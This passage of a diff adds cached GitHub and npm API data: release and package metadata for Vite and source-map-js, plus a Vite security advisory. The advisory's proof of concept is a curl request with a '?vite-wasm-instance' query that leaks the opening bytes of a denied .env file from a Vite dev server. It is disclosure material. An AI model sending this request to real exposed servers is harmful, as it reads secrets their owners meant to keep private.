+                     "description":  "### Summary\r\n\r\nThe first 4 bytes of files outside of `server.fs` setting can be returned to the browser by a request containing `?vite-wasm-instance`.\r\n\r\n### Impact\r\n\r\n Only apps that match one of the following conditions are affected:\r\n\r\n- explicitly expose the Vite dev server to the network using `--host` or the [`server.host`](https://vite.dev/config/server-options#server-host) option\r\n- there\u0027s a file that has a sensitive information in **the first 4 bytes**\r\n- uses Node.js or Deno to run Vite (if Bun is used, it is not affected)\r\n\r\n### Details\r\nRequests containing the `?vite-wasm-instance` query are handled by the internal Wasm plugin\u0027s `load` hook. The hook removes the query and reads the resulting path directly from disk, but the `server.fs` checks were not applied.\r\n\r\nAfter reading the file, Vite attempts to parse it as WebAssembly. When that parse fails, Node and deno throws an error that contains the first 4 bytes of the file.\r\n\r\n### PoC\r\n\r\nCreate a denied file and start an affected Vite dev server:\r\n\r\n```bash\r\necho \u0027SECRET_KEY=abc123\\n\u0027 \u003e .env\r\nnpm run dev\r\ncurl \u0027http://localhost:5173/.env?vite-wasm-instance\u0027\r\n```\r\n\r\nThis will show\r\n```\r\nFailed to parse WASM file \"\u003croot\u003e/.env\": WebAssembly.compile(): expected magic word 00 61 73 6d, found 53 45 43 52 @+0\r\n```\r\n",
+                     "severity":  "medium",
+                     "author":  null,
+                     "publisher":  {
+                                       "login":  "sapphi-red",
+                                       "id":  49056869,
+                                       "node_id":  "MDQ6VXNlcjQ5MDU2ODY5",
+                                       "avatar_url":  "https://avatars.githubusercontent.com/u/49056869?v=4",
+                                       "gravatar_id":  "",
+                                       "url":  "https://api.github.com/users/sapphi-red",
+                                       "html_url":  "https://github.com/sapphi-red",
+                                       "followers_url":  "https://api.github.com/users/sapphi-red/followers",
+                                       "following_url":  "https://api.github.com/users/sapphi-red/following{/other_user}",
+                                       "gists_url":  "https://api.github.com/users/sapphi-red/gists{/gist_id}",
+                                       "starred_url":  "https://api.github.com/users/sapphi-red/starred{/owner}{/repo}",
+                                       "subscriptions_url":  "https://api.github.com/users/sapphi-red/subscriptions",
+                                       "organizations_url":  "https://api.github.com/users/sapphi-red/orgs",
+                                       "repos_url":  "https://api.github.com/users/sapphi-red/repos",
+                                       "events_url":  "https://api.github.com/users/sapphi-red/events{/privacy}",
+                                       "received_events_url":  "https://api.github.com/users/sapphi-red/received_events",
+                                       "type":  "User",
+                                       "user_view_type":  "public",
+                                       "site_admin":  false
+                                   },
+                     "identifiers":  [
+                                         {
+                                             "value":  "GHSA-vfpm-58rq-9qcg",
+                                             "type":  "GHSA"
+                                         },
+                                         {
+                                             "value":  "CVE-2026-112947",
+                                             "type":  "CVE"
+                                         }
+                                     ],
+                     "state":  "published",
+                     "created_at":  null,
+                     "updated_at":  "2026-10-20T15:07:15Z",
+                     "published_at":  "2026-10-06T14:15:34Z",
+                     "closed_at":  null,
+                     "withdrawn_at":  null,
+                     "submission":  null,
+                     "vulnerabilities":  [
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "vite"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003e=8.3.0,\u003c=8.3.2",
+                                                 "patched_versions":  "8.3.3",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             },
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "vite"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003e= 8.2.0, \u003c= 8.2.3",
+                                                 "patched_versions":  "8.2.4",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             },
+                                             {
+                                                 "package":  {
+                                                                 "ecosystem":  "npm",
+                                                                 "name":  "vite-plus"
+                                                             },
+                                                 "vulnerable_version_range":  "\u003e=0.2.8, \u003c=1.0.0",
+                                                 "patched_versions":  "1.1.0",
+                                                 "vulnerable_functions":  [
+
+                                                                          ]
+                                             }
+                                         ],
+                     "cvss_severities":  {
+                                             "cvss_v3":  {
+                                                             "vector_string":  null,
+                                                             "score":  null
+                                                         },
+                                             "cvss_v4":  {
+                                                             "vector_string":  "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
+                                                             "score":  6.3
+                                                         }
+                                         },
+                     "cwes":  [
+                                  {
+                                      "cwe_id":  "CWE-22",
+                                      "name":  "Improper Limitation of a Pathname to a Restricted Directory"
+                                  },
+                                  {
+                                      "cwe_id":  "CWE-200",
+                                      "name":  "Exposure of Sensitive Information to an Unauthorized Actor"
+                                  },
+                                  {
+                                      "cwe_id":  "CWE-209",
+                                      "name":  "Generation of Error Message Containing Sensitive Information"
+                                  }
+                              ],
+                     "cwe_ids":  [
+                                     "CWE-22",
+                                     "CWE-200",
+                                     "CWE-209"
+                                 ],
+                     "credits":  [
+                                     {
+                                         "login":  "zer0d4y5",
+                                         "type":  "reporter"
+                                     },
+                                     {
+                                         "login":  "bluwy",
+                                         "type":  "remediation_reviewer"
+                                     }
+                                 ],
+                     "credits_detailed":  [
+                                              {
+                                                  "user":  {
+                                                               "login":  "zer0d4y5",
+                                                               "id":  80118415,
+                                                               "node_id":  "MDQ6VXNlcjgwMTE4NDE1",
+                                                               "avatar_url":  "https://avatars.githubusercontent.com/u/80118415?v=4",
+                                                               "gravatar_id":  "",
+                                                               "url":  "https://api.github.com/users/zer0d4y5",
+                                                               "html_url":  "https://github.com/zer0d4y5",
+                                                               "followers_url":  "https://api.github.com/users/zer0d4y5/followers",
+                                                               "following_url":  "https://api.github.com/users/zer0d4y5/following{/other_user}",
+                                                               "gists_url":  "https://api.github.com/users/zer0d4y5/gists{/gist_id}",
+                                                               "starred_url":  "https://api.github.com/users/zer0d4y5/starred{/owner}{/repo}",
+                                                               "subscriptions_url":  "https://api.github.com/users/zer0d4y5/subscriptions",
+                                                               "organizations_url":  "https://api.github.com/users/zer0d4y5/orgs",
+                                                               "repos_url":  "https://api.github.com/users/zer0d4y5/repos",
+                                                               "events_url":  "https://api.github.com/users/zer0d4y5/events{/privacy}",
+                                                               "received_events_url":  "https://api.github.com/users/zer0d4y5/received_events",
+                                                               "type":  "User",
+                                                               "user_view_type":  "public",
+                                                               "site_admin":  false
+                                                           },
+                                                  "type":  "reporter",
+                                                  "state":  "accepted"
+                                              },
+                                              {
+                                                  "user":  {
+                                                               "login":  "bluwy",
+                                                               "id":  34116392,
+                                                               "node_id":  "MDQ6VXNlcjM0MTE2Mzky",
+                                                               "avatar_url":  "https://avatars.githubusercontent.com/u/34116392?v=4",
+                                                               "gravatar_id":  "",
+                                                               "url":  "https://api.github.com/users/bluwy",
+                                                               "html_url":  "https://github.com/bluwy",
+                                                               "followers_url":  "https://api.github.com/users/bluwy/followers",
+                                                               "following_url":  "https://api.github.com/users/bluwy/following{/other_user}",
+                                                               "gists_url":  "https://api.github.com/users/bluwy/gists{/gist_id}",
+                                                               "starred_url":  "https://api.github.com/users/bluwy/starred{/owner}{/repo}",
+                                                               "subscriptions_url":  "https://api.github.com/users/bluwy/subscriptions",
+                                                               "organizations_url":  "https://api.github.com/users/bluwy/orgs",
+                                                               "repos_url":  "https://api.github.com/users/bluwy/repos",
+                                                               "events_url":  "https://api.github.com/users/bluwy/events{/privacy}",
+                                                               "received_events_url":  "https://api.github.com/users/bluwy/received_events",
+                                                               "type":  "User",
+                                                               "user_view_type":  "public",
+                                                               "site_admin":  false
+                                                           },
+                                                  "type":  "remediation_reviewer",
+                                                  "state":  "accepted"
+                                              }
+                                          ],
+                     "collaborating_users":  null,
+                     "collaborating_teams":  null,
+                     "private_fork":  null,
+                     "comments":  3,
+                     "cvss":  {
+                                  "vector_string":  null,
+                                  "score":  null
+                              }
+                 },
+        "retrievedUtc":  "2026-11-16T14:30:48.0982907Z"
+    },
+    {
+        "status":  200,
+        "url":  "https://api.github.com/repos/7rulnik/source-map-js/releases/tags/v1.2.2",
+        "data":  {
+                     "url":  "https://api.github.com/repos/7rulnik/source-map-js/releases/400079972",
+                     "assets_url":  "https://api.github.com/repos/7rulnik/source-map-js/releases/400079972/assets",
+                     "upload_url":  "https://uploads.github.com/repos/7rulnik/source-map-js/releases/400079972/assets{?name,label}",
+                     "html_url":  "https://github.com/7rulnik/source-map-js/releases/tag/v1.2.2",
+                     "id":  400079972,
+                     "author":  {
+                                    "login":  "7rulnik",
+                                    "id":  5969049,
+                                    "node_id":  "MDQ6VXNlcjU5NjkwNDk=",
+                                    "avatar_url":  "https://avatars.githubusercontent.com/u/5969049?v=4",
+                                    "gravatar_id":  "",
+                                    "url":  "https://api.github.com/users/7rulnik",
+                                    "html_url":  "https://github.com/7rulnik",
+                                    "followers_url":  "https://api.github.com/users/7rulnik/followers",
+                                    "following_url":  "https://api.github.com/users/7rulnik/following{/other_user}",
+                                    "gists_url":  "https://api.github.com/users/7rulnik/gists{/gist_id}",
+                                    "starred_url":  "https://api.github.com/users/7rulnik/starred{/owner}{/repo}",
+                                    "subscriptions_url":  "https://api.github.com/users/7rulnik/subscriptions",
+                                    "organizations_url":  "https://api.github.com/users/7rulnik/orgs",
+                                    "repos_url":  "https://api.github.com/users/7rulnik/repos",
+                                    "events_url":  "https://api.github.com/users/7rulnik/events{/privacy}",
+                                    "received_events_url":  "https://api.github.com/users/7rulnik/received_events",
+                                    "type":  "User",
+                                    "user_view_type":  "public",
+                                    "site_admin":  false
+                                },
+                     "node_id":  "RE_kwDOE6wQlc4X2Lxk",
+                     "tag_name":  "v1.2.2",
+                     "target_commitish":  "main",
+                     "name":  "v1.2.2",
+                     "draft":  false,
+                     "immutable":  false,
+                     "prerelease":  false,
+                     "created_at":  "2026-09-30T13:24:00Z",
+                     "updated_at":  "2026-09-30T13:58:11Z",
+                     "published_at":  "2026-09-30T13:34:23Z",
+                     "assets":  [
+
+                                ],
+                     "tarball_url":  "https://api.github.com/repos/7rulnik/source-map-js/tarball/v1.2.2",
+                     "zipball_url":  "https://api.github.com/repos/7rulnik/source-map-js/zipball/v1.2.2",
+                     "body":  "* Fix crash when executing in browser with CSP script-src that don\u0027t permit unsafe-eval ([#29](https://github.com/7rulnik/source-map-js/pull/29)) [@xfournet](https://github.com/xfournet)\n\n* Fix denial of service from malicious indexed source maps (CVE-2026-93749) ([#79](https://github.com/7rulnik/source-map-js/pull/79))\n\n  Reported by [@waydeshi](https://github.com/waydeshi) in [#76](https://github.com/7rulnik/source-map-js/issues/76). A fix was also proposed by [@aniebiet](https://github.com/aniebiet) in [#78](https://github.com/7rulnik/source-map-js/pull/78).\n"
+                 },
+        "retrievedUtc":  "2026-11-16T14:30:48.3470897Z"
+    },
+    {
+        "status":  200,
+        "url":  "https://api.github.com/repos/vitejs/vite/releases/tags/v8.3.3",
+        "data":  {
+                     "url":  "https://api.github.com/repos/vitejs/vite/releases/404302000",
+                     "assets_url":  "https://api.github.com/repos/vitejs/vite/releases/404302000/assets",
+                     "upload_url":  "https://uploads.github.com/repos/vitejs/vite/releases/404302000/assets{?name,label}",
+                     "html_url":  "https://github.com/vitejs/vite/releases/tag/v8.3.3",
+                     "id":  404302000,
+                     "author":  {
+                                    "login":  "github-actions[bot]",
+                                    "id":  41898282,
+                                    "node_id":  "MDM6Qm90NDE4OTgyODI=",
+                                    "avatar_url":  "https://avatars.githubusercontent.com/in/15368?v=4",
+                                    "gravatar_id":  "",
+                                    "url":  "https://api.github.com/users/github-actions%5Bbot%5D",
+                                    "html_url":  "https://github.com/apps/github-actions",
+                                    "followers_url":  "https://api.github.com/users/github-actions%5Bbot%5D/followers",
+                                    "following_url":  "https://api.github.com/users/github-actions%5Bbot%5D/following{/other_user}",
+                                    "gists_url":  "https://api.github.com/users/github-actions%5Bbot%5D/gists{/gist_id}",
+                                    "starred_url":  "https://api.github.com/users/github-actions%5Bbot%5D/starred{/owner}{/repo}",
+                                    "subscriptions_url":  "https://api.github.com/users/github-actions%5Bbot%5D/subscriptions",
+                                    "organizations_url":  "https://api.github.com/users/github-actions%5Bbot%5D/orgs",
+                                    "repos_url":  "https://api.github.com/users/github-actions%5Bbot%5D/repos",
+                                    "events_url":  "https://api.github.com/users/github-actions%5Bbot%5D/events{/privacy}",
+                                    "received_events_url":  "https://api.github.com/users/github-actions%5Bbot%5D/received_events",
+                                    "type":  "Bot",
+                                    "user_view_type":  "public",
+                                    "site_admin":  false
+                                },
+                     "node_id":  "RE_kwDOD1jqbs4YGSiw",
+                     "tag_name":  "v8.3.3",
+                     "target_commitish":  "fea5b21dd9524ed7308632407b996f1fe5942c9c",
+                     "name":  "v8.3.3",
+                     "draft":  false,
+                     "immutable":  true,
+                     "prerelease":  false,
+                     "created_at":  "2026-10-06T03:48:21Z",
+                     "updated_at":  "2026-10-06T08:23:01Z",
+                     "published_at":  "2026-10-06T04:07:42Z",
+                     "assets":  [
+
+                                ],
+                     "tarball_url":  "https://api.github.com/repos/vitejs/vite/tarball/v8.3.3",
+                     "zipball_url":  "https://api.github.com/repos/vitejs/vite/zipball/v8.3.3",
+                     "body":  "### Bug Fixes\r\n\r\n* **deps:** update launch-editor to v2.14.2 ([#23654](https://github.com/vitejs/vite/issues/23654)) ([22fd1d5](https://github.com/vitejs/vite/commit/22fd1d5238cce2ee9db0eb4122f9e8feb6b06097))\r\n* **html:** filename passed to transformIndexHtml should not include queries ([#23653](https://github.com/vitejs/vite/issues/23653)) ([7dafd8e](https://github.com/vitejs/vite/commit/7dafd8e56f152403a3230608fa4005273c2e9e17))\r\n* **server:** check `fs.serve` for `?vite-wasm-instance` ([#23655](https://github.com/vitejs/vite/issues/23655)) ([ba8b7ab](https://github.com/vitejs/vite/commit/ba8b7ab43b4afa5d0292ab4b6e3a7b5033cc9c73))\r\n* **server:** store ids to `safeModulePaths` rather than URLs ([#23656](https://github.com/vitejs/vite/issues/23656)) ([c3e06f9](https://github.com/vitejs/vite/commit/c3e06f92e969952466b4e2f5801e85e1e00cd905))\r\n",
+                     "reactions":  {
+                                       "url":  "https://api.github.com/repos/vitejs/vite/releases/404302000/reactions",
+                                       "total_count":  22,
+                                       "+1":  9,
+                                       "-1":  0,
+                                       "laugh":  1,
+                                       "hooray":  5,
+                                       "confused":  0,
+                                       "heart":  2,
+                                       "rocket":  4,
+                                       "eyes":  1
+                                   }
+                 },
+        "retrievedUtc":  "2026-11-16T14:30:48.6305657Z"
+    },
+    {
+        "status":  200,
+        "url":  "https://registry.npmjs.org/vite/8.3.3",
+        "data":  {
+                     "//":  "READ CONTRIBUTING.md to understand what to put under deps vs. devDeps!",
+                     "bin":  {
+                                 "vite":  "bin/vite.js"
+                             },
+                     "bugs":  {
+                                  "url":  "https://github.com/vitejs/vite/issues"
+                              },
+                     "dist":  {
+                                  "shasum":  "12651726ab1cca0a9e1e649e3cb4dca5b6b006a9",
+                                  "tarball":  "https://registry.npmjs.org/vite/-/vite-8.3.3.tgz",
+                                  "fileCount":  37,
+                                  "integrity":  "sha512-cTAldKPImjg6c+gk48U19POPn3GCBzZwpdsN8ZMEEcbpes+6/wvfqUd0C2y3qYY4wsj8PwgFwrZ/1jBPVttMSg==",
+                                  "signatures":  [
+                                                     {
+                                                         "sig":  "MEUCIQCoJsvIakHn0hDToU0LxVCxnYmwG8Ws06U2UL6PQmG1zgIgAml/hlBzxRAqrh9k/79IS3jQPhLi9RSpEjGh4sMM7x8=",
+                                                         "keyid":  "SHA256:DhQ8wR5APBvFHLF/+Tc+AYvPOdTpcIDqOhxsBHRwC7U"
+                                                     },
+                                                     {
+                                                         "sig":  "MEUCIQCiS+ZuRm9tlZPzPGhCqBb7jl5FZ/BOBf2vH2JDf2GgIgIgKgdKWqncxzwU3LTs1PKS9fVUvOAWMnsmSqty+p+7jH0=",
+                                                         "keyid":  "SHA256:DhQ8wR5APBvFHLF/+Tc+AYvPOdTpcIDqOhxsBHRwC7U"
+                                                     }
+                                                 ],
+                                  "attestations":  {
+                                                       "url":  "https://registry.npmjs.org/-/npm/v1/attestations/vite@8.3.3",
+                                                       "provenance":  {
+                                                                          "predicateType":  "https://slsa.dev/provenance/v1"
+                                                                      }
+                                                   },
+                                  "unpackedSize":  2374102
+                              },
+                     "name":  "vite",
+                     "type":  "module",
+                     "author":  "Evan You",
+                     "engines":  {
+                                     "node":  "^20.19.0 || \u003e=22.12.0"
+                                 },
+                     "exports":  {
+                                     ".":  "./dist/node/index.js",
+                                     "./client":  {
+                                                      "types":  "./client.d.ts"
+                                                  },
+                                     "./types/*":  {
+                                                       "types":  "./types/*"
+                                                   },
+                                     "./internal":  "./dist/node/internal.js",
+                                     "./package.json":  "./package.json",
+                                     "./dist/client/*":  "./dist/client/*",
+                                     "./module-runner":  "./dist/node/module-runner.js",
+                                     "./types/internal/*":  null
+                                 },
+                     "funding":  "https://github.com/vitejs/vite?sponsor=1",
+                     "imports":  {
+                                     "#types/*":  "./types/*.d.ts",
+                                     "#dep-types/*":  "./src/types/*.d.ts",
+                                     "#module-sync-enabled":  {
+                                                                  "default":  "./misc/false.js",
+                                                                  "module-sync":  "./misc/true.js"
+                                                              }
+                                 },
+                     "license":  "MIT",
+                     "scripts":  {
+                                     "dev":  "premove dist \u0026\u0026 pnpm build-bundle -w",
+                                     "lint":  "eslint --cache --ext .ts src/**",
+                                     "build":  "premove dist \u0026\u0026 pnpm build-bundle \u0026\u0026 pnpm build-types",
+                                     "format":  "oxfmt",
+                                     "typecheck":  "tsc \u0026\u0026 tsc -p src/node \u0026\u0026 tsc -p src/client \u0026\u0026 tsc -p src/module-runner \u0026\u0026 tsc -p src/shared \u0026\u0026 tsc -p src/node/__tests_dts__ \u0026\u0026 tsc -p src/module-runner/__tests_dts__",
+                                     "build-types":  "pnpm build-types-roll \u0026\u0026 pnpm build-types-check",
+                                     "build-bundle":  "rolldown --config rolldown.config.ts",
+                                     "generate-target":  "tsx scripts/generateTarget.ts",
+                                     "build-types-roll":  "rolldown --config rolldown.dts.config.ts",
+                                     "build-types-check":  "tsc --project tsconfig.check.json"
+                                 },
+                     "_npmUser":  {
+                                      "name":  "GitHub Actions",
+                                      "email":  "npm-oidc-no-reply@github.com",
+                                      "trustedPublisher":  {
+                                                               "id":  "github",
+                                                               "oidcConfigId":  "a2e674b1-239b-4e35-a07f-7b43debc0a8c"
+                                                           }
+                                  },
+                     "homepage":  "https://vite.dev",
+                     "keywords":  [
+                                      "build-tool",
+                                      "dev-server",
+                                      "framework",
+                                      "frontend",
+                                      "hmr",
+                                      "vite"
+                                  ],
+                     "repository":  {
+                                        "url":  "git+https://github.com/vitejs/vite.git",
+                                        "type":  "git",
+                                        "directory":  "packages/vite"
+                                    },
+                     "description":  "Native-ESM powered web dev build tool",
+                     "directories":  {
+
+                                     },
+                     "maintainers":  [
+                                         {
+                                             "name":  "yyx990803",
+                                             "email":  "yyx990803@gmail.com"
+                                         },
+                                         {
+                                             "name":  "vitebot",
+                                             "email":  "vite@voidzero.dev"
+                                         }
+                                     ],
+                     "dependencies":  {
+                                          "postcss":  "^8.5.28",
+                                          "rolldown":  "~1.2.11",
+                                          "picomatch":  "^4.0.7",
+                                          "tinyglobby":  "^0.2.17",
+                                          "lightningcss":  "^1.33.0"
+                                      },
+                     "_hasShrinkwrap":  false,
+                     "devDependencies":  {
+                                             "ws":  "^8.22.0",
+                                             "cac":  "^7.0.0",
+                                             "ufo":  "^1.6.4",
+                                             "cors":  "^2.8.6",
+                                             "etag":  "^1.8.1",
+                                             "mlly":  "^1.8.2",
+                                             "obug":  "^1.0.2",
+                                             "open":  "^10.2.0",
+                                             "sass":  "^1.105.0",
+                                             "sirv":  "^3.0.2",
+                                             "pathe":  "^2.0.3",
+                                             "mrmime":  "^2.0.1",
+                                             "nanoid":  "^5.1.16",
+                                             "parse5":  "^8.0.1",
+                                             "rollup":  "^4.59.0",
+                                             "terser":  "^5.51.2",
+                                             "connect":  "^3.7.0",
+                                             "esbuild":  "^0.28.2",
+                                             "premove":  "^4.0.0",
+                                             "chokidar":  "^3.6.0",
+                                             "tinyexec":  "^1.3.1",
+                                             "artichokie":  "^0.4.5",
+                                             "periscopic":  "^4.0.3",
+                                             "picocolors":  "^1.1.1",
+                                             "escape-html":  "^1.0.3",
+                                             "fresh-import":  "^0.2.1",
+                                             "http-proxy-3":  "^1.23.3",
+                                             "magic-string":  "^1.4.2",
+                                             "@babel/parser":  "^7.29.9",
+                                             "@types/pnpapi":  "^0.0.5",
+                                             "@vitest/utils":  "^4.1.11",
+                                             "dotenv-expand":  "^13.0.0",
+                                             "estree-walker":  "^3.0.3",
+                                             "sass-embedded":  "^1.105.0",
+                                             "strip-literal":  "^4.0.0",
+                                             "postcss-import":  "^16.2.0",
+                                             "es-module-lexer":  "^2.3.2",
+                                             "postcss-modules":  "^9.0.1",
+                                             "resolve.exports":  "^2.0.3",
+                                             "@vitejs/devtools":  "^0.7.6",
+                                             "@polka/compression":  "^1.0.0-next.25",
+                                             "@types/escape-html":  "^1.0.4",
+                                             "convert-source-map":  "^2.0.0",
+                                             "@rollup/pluginutils":  "^5.4.0",
+                                             "postcss-load-config":  "^6.0.1",
+                                             "rolldown-plugin-dts":  "^0.28.6",
+                                             "@rollup/plugin-alias":  "^6.0.0",
+                                             "@vercel/detect-agent":  "^1.2.5",
+                                             "@jridgewell/remapping":  "^2.3.5",
+                                             "rollup-plugin-license":  "^3.7.1",
+                                             "baseline-browser-mapping":  "^2.11.26",
+                                             "launch-editor-middleware":  "^2.14.2",
+                                             "@jridgewell/trace-mapping":  "^0.3.31",
+                                             "host-validation-middleware":  "^0.1.4",
+                                             "@voidzero-dev/vite-task-client":  "^0.2.0",
+                                             "@rollup/plugin-dynamic-import-vars":  "2.1.4"
+                                         },
+                     "peerDependencies":  {
+                                              "tsx":  "^4.8.1",
+                                              "jiti":  "\u003e=1.21.0",
+                                              "less":  "^4.0.0",
+                                              "sass":  "^1.70.0",
+                                              "yaml":  "^2.4.2",
+                                              "stylus":  "\u003e=0.54.8",
+                                              "terser":  "^5.16.0",
+                                              "esbuild":  "^0.27.0 || ^0.28.0",
+                                              "sugarss":  "^5.0.0",
+                                              "@types/node":  "^20.19.0 || \u003e=22.12.0",
+                                              "sass-embedded":  "^1.70.0",
+                                              "@vitejs/devtools":  "^0.7.1"
+                                          },
+                     "optionalDependencies":  {
+                                                  "fsevents":  "~2.3.3"
+                                              },
+                     "peerDependenciesMeta":  {
+                                                  "tsx":  {
+                                                              "optional":  true
+                                                          },
+                                                  "jiti":  {
+                                                               "optional":  true
+                                                           },
+                                                  "less":  {
+                                                               "optional":  true
+                                                           },
+                                                  "sass":  {
+                                                               "optional":  true
+                                                           },
+                                                  "yaml":  {
+                                                               "optional":  true
+                                                           },
+                                                  "stylus":  {
+                                                                 "optional":  true
+                                                             },
+                                                  "terser":  {
+                                                                 "optional":  true
+                                                             },
+                                                  "esbuild":  {
+                                                                  "optional":  true
+                                                              },
+                                                  "sugarss":  {
+                                                                  "optional":  true
+                                                              },
+                                                  "@types/node":  {
+                                                                      "optional":  true
+                                                                  },
+                                                  "sass-embedded":  {
+                                                                        "optional":  true
+                                                                    },
+                                                  "@vitejs/devtools":  {
+                                                                           "optional":  true
+                                                                       }
+                                              },
+                     "_npmOperationalInternal":  {
+                                                     "tmp":  "tmp/vite_8.3.3_1791259819204_0.6829719927178373",
+                                                     "host":  "s3://npm-registry-packages-npm-production"
+                                                 },
+                     "_id":  "vite@8.3.3",
+                     "version":  "8.3.3"
+                 },
+        "retrievedUtc":  "2026-11-16T14:30:48.8022845Z"
+    },
+    {
+        "status":  200,
+        "url":  "https://registry.npmjs.org/source-map-js/1.2.2",
+        "data":  {
+                     "bugs":  {
+                                  "url":  "https://github.com/7rulnik/source-map-js/issues"
+                              },
+                     "dist":  {
+                                  "shasum":  "79fb88d97535a21cb27162cb05d211b67acea4ab",
+                                  "tarball":  "https://registry.npmjs.org/source-map-js/-/source-map-js-1.2.2.tgz",
+                                  "fileCount":  18,
+                                  "integrity":  "sha512-KGj/8Y43x35aZVDtt+J4mK1hoLGHULMYfSkODJNQjNDC3oW1PqPoxMwo0pLUsWM/UEGzON/NxeHywEfNXNP3Vw==",
+                                  "signatures":  [
+                                                     {
+                                                         "sig":  "MEUCIQCZPHMjtDeHbdrm8FkXj5rlr8cwbP4XoW93v0jVGGdWcQIgDcavClXA2dNCvB2XyxxKW7ZkgwaSlqeBeaayOtgq3ik=",
+                                                         "keyid":  "SHA256:DhQ8wR5APBvFHLF/+Tc+AYvPOdTpcIDqOhxsBHRwC7U"
+                                                     },
+                                                     {
+                                                         "sig":  "MEQCIAIRiJPeK+kn49RlwVL7LPl5GHFd6PnL/DKFgl/oQu6HAiBd4xIiwYFmu+pXEiZr7YrCXUt4BQ3XkahaDqCpu90zYA==",
+                                                         "keyid":  "SHA256:DhQ8wR5APBvFHLF/+Tc+AYvPOdTpcIDqOhxsBHRwC7U"
+                                                     }
+                                                 ],
+                                  "unpackedSize":  142723
+                              },
+                     "main":  "./source-map.js",
+                     "name":  "source-map-js",
+                     "author":  {
+                                    "name":  "Valentin 7rulnik Semirulnik",
+                                    "email":  "v7rulnik@gmail.com"
+                                },
+                     "engines":  {
+                                     "node":  "\u003e=0.10.0"
+                                 },
+                     "gitHead":  "0a1d334fd1e55a47df97fcd60a7915d46df3b08a",
+                     "license":  "BSD-3-Clause",
+                     "scripts":  {
+                                     "toc":  "doctoc --title \u0027## Table of Contents\u0027 README.md \u0026\u0026 doctoc --title \u0027## Table of Contents\u0027 CONTRIBUTING.md",
+                                     "test":  "npm run build \u0026\u0026 node test/run-tests.js",
+                                     "build":  "webpack --color"
+                                 },
+                     "typings":  "source-map.d.ts",
+                     "_npmUser":  {
+                                      "name":  "7rulnik",
+                                      "email":  "v7rulnik@gmail.com"
+                                  },
+                     "homepage":  "https://github.com/7rulnik/source-map-js",
+                     "repository":  {
+                                        "url":  "git+https://github.com/7rulnik/source-map-js.git",
+                                        "type":  "git"
+                                    },
+                     "_npmVersion":  "11.19.1",
+                     "description":  "Generates and consumes source maps",
+                     "directories":  {
+
+                                     },
+                     "maintainers":  [
+                                         {
+                                             "name":  "7rulnik",
+                                             "email":  "v7rulnik@gmail.com"
+                                         }
+                                     ],
+                     "_nodeVersion":  "26.10.0",
+                     "contributors":  [
+                                          {
+                                              "name":  "Nick Fitzgerald",
+                                              "email":  "nfitzgerald@mozilla.com"
+                                          },
+                                          {
+                                              "name":  "Tobias Koppers",
+                                              "email":  "tobias.koppers@googlemail.com"
+                                          },
+                                          {
+                                              "name":  "Duncan Beevers",
+                                              "email":  "duncan@dweebd.com"
+                                          },
+                                          {
+                                              "name":  "Stephen Crane",
+                                              "email":  "scrane@mozilla.com"
+                                          },
+                                          {
+                                              "name":  "Ryan Seddon",
+                                              "email":  "seddon.ryan@gmail.com"
+                                          },
+                                          {
+                                              "name":  "Miles Elam",
+                                              "email":  "miles.elam@deem.com"
+                                          },
+                                          {
+                                              "name":  "Mihai Bazon",
+                                              "email":  "mihai.bazon@gmail.com"
+                                          },
+                                          {
+                                              "name":  "Michael Ficarra",
+                                              "email":  "github.public.email@michael.ficarra.me"
+                                          },
+                                          {
+                                              "name":  "Todd Wolfson",
+                                              "email":  "todd@twolfson.com"
+                                          },
+                                          {
+                                              "name":  "Alexander Solovyov",
+                                              "email":  "alexander@solovyov.net"
+                                          },
+                                          {
+                                              "name":  "Felix Gnass",
+                                              "email":  "fgnass@gmail.com"
+                                          },
+                                          {
+                                              "name":  "Conrad Irwin",
+                                              "email":  "conrad.irwin@gmail.com"
+                                          },
+                                          {
+                                              "name":  "usrbincc",
+                                              "email":  "usrbincc@yahoo.com"
+                                          },
+                                          {
+                                              "name":  "David Glasser",
+                                              "email":  "glasser@davidglasser.net"
+                                          },
+                                          {
+                                              "name":  "Chase Douglas",
+                                              "email":  "chase@newrelic.com"
+                                          },
+                                          {
+                                              "name":  "Evan Wallace",
+                                              "email":  "evan.exe@gmail.com"
+                                          },
+                                          {
+                                              "name":  "Heather Arthur",
+                                              "email":  "fayearthur@gmail.com"
+                                          },
+                                          {
+                                              "name":  "Hugh Kennedy",
+                                              "email":  "hughskennedy@gmail.com"
+                                          },
+                                          {
+                                              "name":  "David Glasser",
+                                              "email":  "glasser@davidglasser.net"
+                                          },
+                                          {
+                                              "name":  "Simon Lydell",
+                                              "email":  "simon.lydell@gmail.com"
+                                          },
+                                          {
+                                              "name":  "Jmeas Smith",
+                                              "email":  "jellyes2@gmail.com"
+                                          },
+                                          {
+                                              "name":  "Michael Z Goddard",
+                                              "email":  "mzgoddard@gmail.com"
+                                          },
+                                          {
+                                              "name":  "azu",
+                                              "email":  "azu@users.noreply.github.com"
+                                          },
+                                          {
+                                              "name":  "John Gozde",
+                                              "email":  "john@gozde.ca"
+                                          },
+                                          {
+                                              "name":  "Adam Kirkton",
+                                              "email":  "akirkton@truefitinnovation.com"
+                                          },
+                                          {
+                                              "name":  "Chris Montgomery",
+                                              "email":  "christopher.montgomery@dowjones.com"
+                                          },
+                                          {
+                                              "name":  "J. Ryan Stinnett",
+                                              "email":  "jryans@gmail.com"
+                                          },
+                                          {
+                                              "name":  "Jack Herrington",
+                                              "email":  "jherrington@walmartlabs.com"
+                                          },
+                                          {
+                                              "name":  "Chris Truter",
+                                              "email":  "jeffpalentine@gmail.com"
+                                          },
+                                          {
+                                              "name":  "Daniel Espeset",
+                                              "email":  "daniel@danielespeset.com"
+                                          },
+                                          {
+                                              "name":  "Jamie Wong",
+                                              "email":  "jamie.lf.wong@gmail.com"
+                                          },
+                                          {
+                                              "name":  "Eddy BruÃ«l",
+                                              "email":  "ejpbruel@mozilla.com"
+                                          },
+                                          {
+                                              "name":  "Hawken Rives",
+                                              "email":  "hawkrives@gmail.com"
+                                          },
+                                          {
+                                              "name":  "Gilad Peleg",
+                                              "email":  "giladp007@gmail.com"
+                                          },
+                                          {
+                                              "name":  "djchie",
